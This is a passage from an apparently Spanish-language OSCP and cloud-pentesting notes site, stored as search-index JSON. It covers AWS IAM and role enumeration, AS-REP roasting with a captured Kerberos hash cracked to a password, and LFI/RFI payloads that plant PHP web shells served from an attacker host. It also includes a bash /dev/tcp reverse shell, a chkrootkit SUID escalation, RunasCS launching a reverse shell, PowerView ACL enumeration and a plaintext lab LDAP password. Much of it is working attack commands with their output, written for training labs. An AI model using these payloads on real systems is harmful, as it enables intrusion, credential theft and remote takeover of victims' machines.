2)</li> <li>Automatiza el proceso con un script que itere sobre los d\u00edgitos.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#enumeracion-de-usuarios-iam-en-otras-cuentas","title":"Enumeraci\u00f3n de Usuarios IAM en Otras Cuentas","text":""},{"location":"CloudHacking/AWS-enumeration/#descripcion_1","title":"Descripci\u00f3n","text":"<p>Esta t\u00e9cnica abusa de la validaci\u00f3n de pol\u00edticas IAM para identificar usuarios existentes en una cuenta objetivo, utilizando el ID de cuenta previamente obtenido.</p>"},{"location":"CloudHacking/AWS-enumeration/#pasos-clave_1","title":"Pasos Clave","text":"<ol> <li>Crear un Bucket S3 en la Cuenta del Atacante:</li> <li> <p>Genera un bucket \u00fanico: <pre><code>aws s3 mb s3://mi-bucket-$RANDOM-$RANDOM-$RANDOM\n</code></pre></p> </li> <li> <p>Definir una Pol\u00edtica de Acceso:</p> </li> <li>Crea una pol\u00edtica que otorgue acceso a un usuario espec\u00edfico en la cuenta objetivo. Ejemplo en <code>grant-s3-bucket-read.json</code>:      <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"AllowUserToListBucket\",\n            \"Effect\": \"Allow\",\n            \"Resource\": \"arn:aws:s3:::mi-bucket-12345-67890-54321\",\n            \"Principal\": {\n                \"AWS\": [\"arn:aws:iam::123456789012:user/cloudadmin\"]\n            },\n            \"Action\": \"s3:ListBucket\"\n        }\n    ]\n}\n</code></pre></li> <li> <p>Aplica la pol\u00edtica al bucket: <pre><code>aws s3api put-bucket-policy --bucket mi-bucket-12345-67890-54321 --policy file://grant-s3-bucket-read.json\n</code></pre></p> </li> <li> <p>Verificar Existencia:</p> </li> <li>Si la pol\u00edtica se aplica sin errores, el usuario existe.</li> <li>Si retorna \"Invalid principal in policy\", el usuario no existe.</li> </ol>"},{"location":"CloudHacking/AWS-enumeration/#ejemplo-practico_1","title":"Ejemplo Pr\u00e1ctico","text":"<ul> <li>Prueba con <code>arn:aws:iam::123456789012:user/admin</code>:</li> <li>\u00c9xito \u2192 El usuario \"admin\" existe.</li> <li>Error \u2192 Prueba otro nombre como \"nonexistent\".</li> <li>Automatiza con una lista de nombres de usuarios potenciales.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#herramientas-utiles","title":"Herramientas \u00datiles","text":""},{"location":"CloudHacking/AWS-enumeration/#pacu","title":"Pacu","text":"<ul> <li>Descripci\u00f3n: Herramienta para automatizar la enumeraci\u00f3n en AWS, incluyendo roles IAM.</li> <li>Instalaci\u00f3n en Kali: <pre><code>sudo apt update\nsudo apt install pacu\n</code></pre></li> <li>Uso B\u00e1sico:</li> <li>Inicia Pacu: <pre><code>pacu\n</code></pre></li> <li>Importa claves: <pre><code>import_keys &lt;perfil&gt;\n</code></pre></li> <li>Ejecuta la enumeraci\u00f3n de roles: <pre><code>run iam__enum_roles --word-list /ruta/a/lista.txt --account-id &lt;ID_de_cuenta&gt;\n</code></pre></li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#awsbucketdump","title":"AWSBucketDump","text":"<ul> <li>Descripci\u00f3n: AWSBucketDump es una herramienta dise\u00f1ada para enumerar y descargar datos de buckets S3 p\u00fablicos en AWS.</li> <li>https://github.com/jordanpotti/AWSBucketDump.git</li> <li>Uso B\u00e1sico:</li> <li>Ejecuta el script para buscar buckets p\u00fablicos:      <pre><code>python AWSBucketDump.py -l lista_de_buckets.txt\n</code></pre></li> <li>Descarga los datos de los buckets encontrados:      <pre><code>python AWSBucketDump.py -d -l lista_de_buckets.txt\n</code></pre></li> <li>Valor: Automatiza la identificaci\u00f3n y extracci\u00f3n de datos sensibles de buckets S3 p\u00fablicos, facilitando la enumeraci\u00f3n en entornos AWS.</li> </ul>"},{"location":"CloudHacking/AWS-enumeration/#ejemplo-con-lista-de-roles","title":"Ejemplo con Lista de Roles","text":"<ul> <li>Crea una lista en <code>/tmp/role-names.txt</code>:   <pre><code>lab_admin\nsecurity_auditor\ncontent_creator\n</code></pre></li> <li>Ejecuta: <pre><code>run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012\n</code></pre></li> </ul>"},{"location":"CloudHacking/cloudHacking/","title":"Cloud Hacking &amp; Pentesting","text":"<ul> <li>AWS Enumeration</li> <li>AWS Attacking</li> </ul>"},{"location":"OSCP/ASREPRoasting/","title":"ASREPRoasting attack","text":"<ul> <li>ASREPRoasting es otro ataque que pide TGT que NO requieran pre-auth en kerberos. -Al obtener el TGT, el atacante puede extraer hashes y realizar ataques de fuerza bruta offline.</li> </ul>"},{"location":"OSCP/ASREPRoasting/#con-powerview","title":"Con powerview","text":"<ul> <li>Importante tener cargado powerview.ps1 y todo el armatoste en la maquina windows comprometida</li> <li><code>Import-Module .\\PowerView.ps1</code></li> <li><code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth</code></li> </ul>"},{"location":"OSCP/ASREPRoasting/#con-ldap-search","title":"con LDAP search","text":"<ul> <li><code>ldapsearch -x -H ldap://&lt;domain_controller&gt; -D \"&lt;username&gt;\" -w &lt;password&gt; -b \"dc=example,dc=com\" \"(userAccountControl:1.2.840.113556.1.4.803:=4194304)\"</code></li> <li>otro comando de ldapsearch: ldapsearch -x -H ldap://10.10.11.174 -D \"SUPPORT\\ldap\" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"DC=support,DC=htb\" '(sAMAccountName=support)' '*'</li> </ul>"},{"location":"OSCP/ASREPRoasting/#solicitar-tgt","title":"Solicitar TGT","text":"<ul> <li><code>impacket-GetNPUsers DOMINIO.LOCAL/ -usersfile users.txt -format hashcat -dc-ip &lt;domain_controller_ip&gt;</code></li> <li><code>PS C:\\htb&gt; .\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></li> </ul>"},{"location":"OSCP/ASREPRoasting/#hashcat","title":"hashcat","text":"<ul> <li><code>hashcat -m 18200 hashes.txt /path/to/wordlist</code></li> </ul>"},{"location":"OSCP/ASREPRoasting/#ejemplo","title":"Ejemplo:","text":""},{"location":"OSCP/ASREPRoasting/#chequeo-con-powerview","title":"Chequeo con powerview:","text":"<pre><code>PS C:\\Tools&gt; Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth\n\n\nDistinguishedName     : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nDoesNotRequirePreAuth : True\nEnabled               : True\nGivenName             : Yolanda\nName                  : Yolanda Groce\nObjectClass           : user\nObjectGUID            : 6e5a4731-13f0-4335-a64c-7ecba3790c00\nSamAccountName        : ygroce\nSID                   : S-1-5-21-3842939050-3880317879-2865463114-1159\nSurname               : Groce\nUserPrincipalName     : ygroce@inlanefreight.local\n\nDistinguishedName     : CN=Matthew Morgan,OU=Server\n                        Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nDoesNotRequirePreAuth : True\nEnabled               : True\nGivenName             : Matthew\nName                  : Matthew Morgan\nObjectClass           : user\nObjectGUID            : c8328fe9-d7c7-467b-a27a-d7596956ab6c\nSamAccountName        : mmorgan\nSID                   : S-1-5-21-3842939050-3880317879-2865463114-1170\nSurname               : Morgan\nUserPrincipalName     : mmorgan@inlanefreight.local\n\nPS C:\\Tools&gt;\n</code></pre>"},{"location":"OSCP/ASREPRoasting/#impacket-getnpusers","title":"impacket-GetNPUsers:","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ impacket-GetNPUsers INLANEFREIGHT.LOCAL/mmorgan -format hashcat -dc-ip 172.16.5.5 -no-pass\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Getting TGT for mmorgan\n/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f59e1034005739d1367aaea1031abeb7$a7f098dfc5e538c5e1fe1eeecb127d259150bf3940beb991af3ba43ca36c0149d3b8d48f9e9b5726f58b5f0cb6901e0dba93a47a2baee327e95c40b6f05dc33bcc500df3f997fb10b7374e2724d08c93ea722f134025105dd100fcbc2ef6a6abe252c2c13055b28b8475d4d4f93203eb258a89be2190e0350470f121dfec1015d3a490271198b4564fd397d30050b6f3027416c117fa81513464f8cb7e06484a68d063b1d95c6c21441f0eae855636d51608f2fa4548d5674dd87cb691feee980183f1902fb85a82422ef0f7171872bb1f333c2904f53ea504ac249e4669259ffd39abe12c166c7160bb6ecf48efd0754f2c497af07bed53ffb1\n</code></pre>"},{"location":"OSCP/ASREPRoasting/#hashcat_1","title":"Hashcat","text":"<pre><code>PS C:\\Users\\Grunt\\Desktop\\hashcat-6.2.6&gt; .\\hashcat.exe hash.txt -m 18200 .\\rockyou.txt\nhashcat (v6.2.6) starting\n\nhiprtcCompileProgram is missing from HIPRTC shared library.\n\nOpenCL API (OpenCL 2.1 AMD-APP (3628.0)) - Platform #1 [Advanced Micro Devices, Inc.]\n=====================================================================================\n* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6732 MB allocatable), 14MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nPure kernels can crack longer passwords, but drastically reduce performance.\nIf you want to switch to optimized kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 122 MB\n\nDictionary cache hit:\n* Filename..: .\\rockyou.txt\n* Passwords.: 14344384\n* Bytes.....: 139921497\n* Keyspace..: 14344384\n\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f59e1034005739d1367aaea1031abeb7$a7f098dfc5e538c5e1fe1eeecb127d259150bf3940beb991af3ba43ca                                                                                                           a36c0149d3b8d48f9e9b5726f58b5f0cb6901e0dba93a47a2baee327e95c40b6f05dc33bcc500df3f997fb10b7374e2724d08c93ea722f134025105dd100fcbc2ef6a                                                                                                           a6abe252c2c13055b28b8475d4d4f93203eb258a89be2190e0350470f121dfec1015d3a490271198b4564fd397d30050b6f3027416c117fa81513464f8cb7e06484a6                                                                                                           68d063b1d95c6c21441f0eae855636d51608f2fa4548d5674dd87cb691feee980183f1902fb85a82422ef0f7171872bb1f333c2904f53ea504ac249e4669259ffd39a                                                                                                           abe12c166c7160bb6ecf48efd0754f2c497af07bed53ffb1:Welcome!00\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)\nHash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f59e10340...53ffb1\nTime.Started.....: Mon Jan 20 18:36:50 2025 (0 secs)\nTime.Estimated...: Mon Jan 20 18:36:50 2025 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (.\\rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........: 18903.4 kH/s (4.23ms) @ Accel:1024 Loops:1 Thr:32 Vec:1\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 10551296/14344384 (73.56%)\nRejected.........: 0/10551296 (0.00%)\nRestore.Point....: 10092544/14344384 (70.36%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: angella14 -&gt; TUGGAB8\nHardware.Mon.#1..: Temp: 54c Fan:  0% Util: 16% Core: 468MHz Mem:1742MHz Bus:8\n\nStarted: Mon Jan 20 18:36:34 2025\nStopped: Mon Jan 20 18:36:51 2025\nPS C:\\Users\\Grunt\\Desktop\\hashcat-6.2.6&gt;\n</code></pre>"},{"location":"OSCP/ASREPRoasting/#ejemplo-con-rubeus","title":"Ejemplo con rubeus","text":"<pre><code>PS C:\\Tools&gt; .\\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n\n[*] Action: AS-REP roasting\n\n[*] Target User            : ygroce\n[*] Target Domain          : INLANEFREIGHT.LOCAL\n\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'\n[*] SamAccountName         : ygroce\n[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)\n[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\\ygroce'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n\n      $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:&lt;ASREP_SALT&gt;$&lt;ASREP_HASH_REDACTED&gt;\n\nPS C:\\Tools&gt;\n</code></pre>"},{"location":"OSCP/LFI/","title":"LFI &amp; Path Traversal","text":""},{"location":"OSCP/LFI/#lfi","title":"LFI","text":"<ul> <li>Payloads Fuzzing<ul> <li>An other one but for linux paths</li> <li>Windows paths</li> </ul> </li> <li>Ejemplo para bypassear filtros: <code>....//....//....//....//etc/passwd</code></li> <li>Encodearlo en URL tambi\u00e9n sirve: <code>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></li> </ul>"},{"location":"OSCP/LFI/#como-poder-ver-archivos-mediante-path-traversal-con-php-wrappers","title":"como poder ver archivos mediante path traversal con PHP wrappers","text":"<ul> <li><code>php://filter/read=convert.base64-encode/resource=ARCHIVO-PHP</code></li> <li>Con esto podriamos ver una clave en texto plano en un wordpress, en el wp-config por ejemplo, el phpinfo, etc.</li> </ul>"},{"location":"OSCP/LFI/#ejemplo-de-rce","title":"Ejemplo de RCE","text":"<ul> <li><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' | base64</code></li> <li><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></li> </ul>"},{"location":"OSCP/LFI/#expect-php-wrapper","title":"Expect PHP Wrapper","text":"<ul> <li>Este wrapper permite correr comandos directo desde URL parecido a las web shells <pre><code>GNT@htb[/htb]$ curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre></li> </ul>"},{"location":"OSCP/LFI/#rfi-remote-file-inclusion","title":"RFI (Remote file inclusion)","text":"<ul> <li>Permite a un atacante incluir un archivo generalmente explotando la inclusi\u00f3n de un archivo dinamico implementado en el aplicativo.</li> <li>Ocurre cuando en un user input no hay una validaci\u00f3n apropiada.</li> <li>en PHP podemos chequearlo con <code>allow_url_include</code>, tambi\u00e9n podemos directamente incluir un URL como payload.<ul> <li><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php</code></li> </ul> </li> </ul>"},{"location":"OSCP/LFI/#rce-rfi","title":"RCE + RFI","text":"<ul> <li><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php</code></li> <li><code>python3 -m http.server 80</code></li> <li><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></li> <li>con ftp <code>python3 -m pyftpdlib -p 21</code></li> <li><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id</code></li> </ul>"},{"location":"OSCP/LFI/#lfi-file-upload","title":"LFI + File upload","text":""},{"location":"OSCP/LFI/#mediante-una-imagen","title":"Mediante una imagen","text":"<ul> <li><code>echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif</code></li> </ul>"},{"location":"OSCP/LFI/#zip-upload","title":"Zip upload","text":"<ul> <li><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></li> <li><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code></li> </ul>"},{"location":"OSCP/LFI/#knockd-lfi-file","title":"knockd LFI file","text":"<ul> <li>fuente</li> <li>knockd es un daemon que se utiliza para abrir puertos en un firewall que est\u00e1 cerrado.</li> <li>Por ejemplo podemos visitar: <code>../../../../../../../../../../etc/knockd.conf</code></li> <li>Y nos devuelve: <code>[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn</code></li> <li>Esto significa que el puerto 22 est\u00e1 cerrado y que knockd est\u00e1 configurado para abrirlo.</li> <li>Para eso vamos a hacer un for loop:</li> </ul> <pre><code>for x in 4000 5000 6000; do\nnmap -Pn --host-timeout 201 --max-retries 0 -p $x $IP;\ndone\n</code></pre> <ul> <li>Esto nos va a dar el puerto que est\u00e1 abierto, y despu\u00e9s podemos hacer un reverse shell con el puerto 22.</li> </ul>"},{"location":"OSCP/OSCP/","title":"OSCP preparation","text":""},{"location":"OSCP/OSCP/#list","title":"List","text":"<ul> <li>Windows Active Directory</li> <li>Shell Management</li> <li>General enumeration</li> <li>Engagement Structure</li> <li>File transfers</li> <li>Metasploit tricks</li> <li>Pivoting</li> <li>Cross-Site Scripting</li> <li>SQL Injection</li> <li>Local File Inclusion &amp; Path Traversal</li> <li>Arbitrary File Upload</li> <li>Command Injection</li> <li>Other web attacks</li> <li>Privilege Escalation</li> <li>Windows Privilege Escalation</li> <li>Reporting</li> <li>Documents, Office, LibreOffice, macros attacks</li> <li>Cookie Extraction</li> <li>Buffer Overflow</li> <li>SMTP/POP/IMAP Mail Server Pentesting</li> <li>Library-MS WebDav Attack</li> </ul>"},{"location":"OSCP/OSCP/#aprobe-el-examen","title":"Aprob\u00e9 el examen","text":"<p>Bueno mis queridos lectores de mi humilde blog, les quer\u00eda comentar que este Domingo 13 de Julio del 2025 me lleg\u00f3 el mail de Offensive Security que me dec\u00eda que hab\u00eda aprobado el examen de OSCP. Mi recorrido por este examen fue bastante arduo y largo pues hice una sobrepreparaci\u00f3n porque le\u00ed demasiada gente llorando y copeando en /r/OSCP que me di\u00f3 un poco de miedo reprobarlo y tener que pagar el recuperatorio que cuesta como 150 dolares. Lo que hice para prepararme fue: - Rendir PNPT - Rendir CPTS - Hacer tres prolabs en Hack the Box:     1. Dante     2. Zephyr     3. Rasta - Hacerme toda la famosa lista de TJ Null todas las maquinas de Hack The Box y de Proving Grounds practice. Cabe aclarar que tengo 3 a\u00f1os de experiencia en la industria y que tambi\u00e9n estoy siguiendo un grado en ciencias de la computaci\u00f3n que es durisimo, as\u00ed que no es que me prepar\u00e9 de la nada, ya ten\u00eda una base s\u00f3lida de conocimientos. Pero si consideramos desde que empec\u00e9 a estudiar para PNPT hasta que rend\u00ed el examen fueron aproximadamente 6 meses. Cualquier duda que tengan al respecto no tengo ning\u00fan problema en responderla por discord, reddit o el mail que est\u00e1 en mi p\u00e1gina web :)</p>"},{"location":"OSCP/OSCP/#y-ahora-que","title":"\u00bfY ahora que?","text":"<p>Ahora probablemente siga estudiando topicos que me interesan que no son tanto de \"pentesting\" como tal. - MalDev =&gt; Tengo un proyecto de armar un C2 funcional con Telegram y con agentes en RUST, algo as\u00ed como Pysilon pero con RUST y Telegram en vez de Python y Discord.     - Tambi\u00e9n seguro me apoye en algunos modulos de Hack The Box Academy del \"CAPE\" que est\u00e1n buenos para aprender evasi\u00f3n entre otros topicos. - ExploitDev =&gt; Con mis conocimientos actuales de arquitectura (ANSI C, NASM x86_64, RISC-V, ABI Linux) me siento capaz de poder aprender a hacer buen reversing y aprender explotaci\u00f3n a bajo nivel. Voy a estar estudiando en pwn.college y con el curso de ret2systems.     - La verdad que me gustar\u00eda ir directo por el OSED pero es muy caro :/ - BSCP =&gt; Burp Suite Certified Practitioner. O sea, aprender hacking web m\u00e1s avanzado, actualmente poseo la eWPTv2 y trabaj\u00e9 mucho sobre aplicaciones web y mobile dentro de mi labor como AppSec, pero a\u00fan as\u00ed creo que puedo abordar m\u00e1s estudiando en los labs de port swigger que tienen muy buena pinta.</p>"},{"location":"OSCP/OSCP/#extras","title":"Extras","text":""},{"location":"OSCP/OSCP/#maquina-centos-una-privesc-rara","title":"Maquina centOS una privesc rara","text":"<ul> <li>https://seclists.org/fulldisclosure/2019/Apr/24</li> </ul>"},{"location":"OSCP/OSCP/#en-una-maquina-que-pwnee-que-tenia-la-vuln-shellshock-fue-clave-la-enumeracion-para-poder-explotar-la-misma","title":"En una maquina que pwnee que ten\u00eda la vuln shellshock, fue clave la enumeraci\u00f3n para poder explotar la misma","text":"<pre><code>\u276f gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 400 -x cgi,php,sh --add-slash\n</code></pre>"},{"location":"OSCP/OSCP/#el-x-sh-me-dio-la-enumeracion-correcta","title":"el -x sh me di\u00f3 la enumeraci\u00f3n correcta","text":"<p>S\u00ed encuentro el puerto 53 es conveniente seguir la siguiente gu\u00eda de enumeraci\u00f3n https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns</p>"},{"location":"OSCP/OSCP/#vulnerabilidad-en-chkrootkit-version-049-para-evitar-usar-metasploit-sirve-chequear","title":"Vulnerabilidad en chkrootkit versi\u00f3n 0.49. Para evitar usar metasploit, sirve chequear:","text":"<p>https://www.exploit-db.com/exploits/33899</p> <pre><code>cat /etc/cron.daily\n\n/usr/bin/chkrootkit\nls -la /usr/bin/chkrootkit     // Do we have SUID?\nchkrootkit -V\necho \"#!/bin/bash\" &gt; /tmp/update\necho \"chmod +s /bin/bash\" &gt;&gt; /tmp/update\nWait a While ...\n/bin/bash -p\nwhoami\n</code></pre>"},{"location":"OSCP/OSCP/#problemas-para-reverse-shell-dentro-de-sqli","title":"Problemas para reverse shell dentro de sqli","text":"<p>Hay veces que cuando puedo obtener RCE mediante una sqli porque tengo acceso de escritura con el user de la db que maneja la aplicaci\u00f3n web no siempre me quiere ejecutar bien una revshell, pero con esto s\u00ed:</p> <pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/$IP/$PORT 0&gt;&amp;1'\n</code></pre> <p>es el \u00fanico que me vino funcionando en 2 maquinas de SQLI</p>"},{"location":"OSCP/RunAs/","title":"Run As C# &amp; Lateral Movement","text":"<ul> <li>RunAsCS es una herramienta de post-explotaci\u00f3n que permite ejecutar un programa como un usuario diferente en un sistema Windows. Esto es \u00fatil para obtener acceso a recursos restringidos o para ejecutar tareas con privilegios elevados.</li> <li>Si tenemos credenciales de un usuario dentro de una maquina pero no podemos acceder a ella, podemos usar RunAsCS para ejecutar un programa como ese usuario. Esto puede ser \u00fatil para obtener acceso a recursos restringidos o para ejecutar tareas con privilegios elevados.</li> <li>Repo</li> <li>Como utilizar<ul> <li><code>.\\RunasCS.exe USER PASSWORD -l 2 \"c:\\Users\\Public\\reverse.exe\"</code></li> </ul> </li> </ul>"},{"location":"OSCP/RunAs/#set-up-pscredential","title":"Set up PSCredential","text":"<ul> <li><code>$password = ConvertTo-SecureString \"PASSWORD\" -AsPlainText -Force</code></li> <li><code>$cred = New-Object System.Management.Automation.PSCredential(\"DOMAIN\\USER\", $password)</code><ul> <li>Luego de haber seteado las credenciales podemos usar el objeto <code>$cred</code> para ejecutar comandos con esas credenciales.</li> </ul> </li> <li>Ejemplos:<ul> <li><code>Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami}</code>: Ejecuta un comando remoto en el equipo objetivo con las credenciales especificadas.</li> <li><code>Enter-PSSession -ComputerName TARGET -Credential $cred</code>: Inicia una sesi\u00f3n remota en el equipo objetivo con las credenciales especificadas.</li> </ul> </li> </ul>"},{"location":"OSCP/aclAdEnum/","title":"AD ACL Enum","text":""},{"location":"OSCP/aclAdEnum/#introduccion","title":"Introducci\u00f3n","text":"<p>PowerView es una herramienta de PowerShell para obtener conocimiento situacional de la red en dominios de Windows. Contiene un conjunto de reemplazos en PowerShell para varios comandos de Windows \"net *\", que utilizan hooks de AD de PowerShell y funciones subyacentes de la API de Win32 para realizar funcionalidades \u00fatiles de dominio de Windows.</p>"},{"location":"OSCP/aclAdEnum/#comandos-de-powerview","title":"Comandos de PowerView","text":""},{"location":"OSCP/aclAdEnum/#find-interestingdomainacl","title":"Find-InterestingDomainAcl","text":"<p>Encuentra ACLs de objetos en el dominio actual (o especificado) con derechos de modificaci\u00f3n establecidos en objetos no integrados.</p> <ul> <li><code>Import-Module .\\PowerView.ps1</code></li> <li><code>Find-InterestingDomainAcl</code></li> </ul>"},{"location":"OSCP/aclAdEnum/#ejemplo","title":"Ejemplo:","text":"<ul> <li>Encuentra ACLs interesantes en el dominio actual.     <pre><code>Find-InterestingDomainAcl\n</code></pre></li> </ul>"},{"location":"OSCP/aclAdEnum/#targeted-enum","title":"Targeted Enum","text":"<ul> <li><code>$sid = Convert-NameToSid USER</code></li> <li><code>Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}</code></li> </ul>"},{"location":"OSCP/aclAdEnum/#mapeo-de-valor-guid","title":"Mapeo de Valor GUID","text":"<ul> <li>Example:<ul> <li><code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\"</code></li> <li><code>Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl</code></li> <li><code>-ResolverGUID</code> flag<ul> <li><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}</code></li> </ul> </li> </ul> </li> </ul>"},{"location":"OSCP/aclAdEnum/#creacion-de-lista-de-usuarios-del-dominio-ad","title":"Creaci\u00f3n de lista de usuarios del dominio AD","text":"<ul> <li><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></li> </ul>"},{"location":"OSCP/aclAdEnum/#chequeo-de-cada-usuario","title":"Chequeo de cada usuario","text":"<ul> <li><code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\SOME-USER\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'DOMAIN\\\\USER'}}</code></li> </ul>"},{"location":"OSCP/aclAdEnum/#ejemplo_1","title":"Ejemplo:","text":"<ul> <li> <p>Enumerando derechos del usuario \"damundsen\"     <pre><code>$sid2 = Convert-NameToSid damundsen\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose\n</code></pre></p> <pre><code>AceType               : AccessAllowed\nObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite\nOpaqueLength          : 0\nObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022\nInheritanceFlags      : ContainerInherit\nBinaryLength          : 36\nIsInherited           : False\nIsCallback            : False\nPropagationFlags      : None\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176\nAccessMask            : 131132\nAuditFlags            : None\nAceFlags              : ContainerInherit\nAceQualifier          : AccessAllowed\n</code></pre> <ul> <li>Este usuario tiene GenericWrite sobre el grupo Help Desk Level 1, esto significa que podemos agregar a cualquier usuario a este grupo con este usuario y tambi\u00e9n que si podemos agregar un usuario a este grupo va a tomar los privilegios de GenericWrite.</li> <li>Podemos chequear si este grupo est\u00e1 \"anidado\" a otro grupo.</li> <li><code>Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof</code> <pre><code>memberof                                                                      \n--------                                                                      \nCN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n</code></pre></li> </ul> </li> </ul>"},{"location":"OSCP/aclAdEnum/#bloodhound","title":"Bloodhound","text":"<ul> <li>Tambi\u00e9n se puede hacer todo esto mucho m\u00e1s f\u00e1cil con Bloodhound en vez de con Powershell.</li> </ul>"},{"location":"OSCP/aclAdEnum/#funciones-adicionales-de-powerview","title":"Funciones adicionales de 